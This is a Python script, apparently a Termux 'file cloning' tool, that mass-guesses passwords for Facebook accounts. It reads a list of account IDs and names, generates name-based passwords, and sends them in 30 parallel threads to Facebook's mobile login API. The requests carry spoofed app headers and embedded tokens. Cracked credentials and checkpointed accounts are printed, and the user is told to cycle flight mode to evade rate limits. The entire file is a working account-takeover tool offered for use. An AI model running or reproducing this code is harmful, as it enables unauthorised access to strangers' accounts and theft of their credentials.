#CREATED BY RONY
#--------------------------import------------------------------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random
import httpx
import json
import sys
os.system("pkg install espeak")
#---------------------------Color-------------------------------# 
#----------------------------logo--------------------------------#
logo =("""
,------.  ,-----. ,--.  ,--.,--.   ,--. 
|  .--. ''  .-.  '|  ,'.|  | \  `.'  /  
|  '--'.'|  | |  ||  |' '  |  '.    /   
|  |\  \ '  '-'  '|  | `   |    |  |    
`--' '--' `-----' `--'  `--'    `--'    Ruba""")
#-----------------------------clear---------------------------#
def clear():
	os.system('clear')
	print(logo)
	print(42*'-')
	print(' [∆] Author:      R : Mohammad Rony')
	print(' [∆] FaceBook:    O : Rony Ruba')
	print(' [∆] Github:      N : Mohammad Rony')
	print(' [∆] Tools:       Y : Free')
	print(' [∆] Versoin:     ® : 0.1')
	print(42*'-')
#---------------------------line-----------------------------#
def line():
	print(42*'-')
#-----------------------manu------------------------------#
def main():
    clear()
    print(' [01] FILE CLONING')
    print(' [02] RANDOM CLONING','coming soon')
    print(' [00] EXIT')
    line()
    option=input(' [??] CHOICE :>')
    if option in ['01','1']:
        __file__()
    else:
       exit (' THANKS FOR USING ')
#------------------------------file---------------------------#
def __file__():
	clear()
	filex=input('[??] Your File Name :')
	try:
		fo=open(filex,'r').read().splitlines()
	except FileNotFoundError:
		print(' File not found !!');slp(2)
		__file__()
	clear()
	try:
		pass_limit=int(input('[??] ENTER PASSWORD LIMIT (1-20) :'))
	except:
		pass_limit=1
	line()
	pas_list=[]
	for i in range(pass_limit):
		passx=input(f'[??] ENTER PASS {i+1} : ')
		pas_list.append(passx)
	with ted(max_workers=30) as Rony:
		tl=str(len(fo))
		clear()
		print(' [∆] TOTAL ACCOUNT :'+tl)
		print(' [∆] USE FLIGHT MODE FOR 5 MIN ')
		print(' [∆] SUPER FAST SPEED')
		print('------------------------------------------')
		for user in fo:
			id,names=user.split('|')
			passlist=pas_list
			Rony.submit(m1,id,names,passlist)
	line()
	print(' [∆] THE PROCESS HAS BEEN COMPLETED')
	line()
	input(' [∆] PRESS ENTER TO BACK :')
	main()
loop=0	
oks=[]
cps=[]
#---------------------------method----------------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [RONY-XD] %s|[OK]:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'DATA', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [RONY=0K] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [RONY=CP] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#------------------------end------------------------#
main()